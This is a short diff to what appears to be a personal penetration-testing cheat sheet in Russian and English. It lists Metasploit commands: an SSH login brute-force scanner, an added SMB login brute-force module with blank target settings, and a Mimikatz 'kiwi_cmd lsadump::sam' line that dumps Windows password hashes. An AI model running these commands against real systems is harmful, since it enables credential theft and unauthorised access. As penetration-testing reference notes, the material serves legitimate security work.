@@ -65,7 +65,9 @@ set filename Test3.pdf
 
 Для брута use auxiliary/scanner/ssh/ssh_login
 
-
+use auxiliary/scanner/smb/smb_login
+set rhost
+set 
 МИМИКАТЗ в метасплойт
 
 kiwi_cmd lsadump::sam
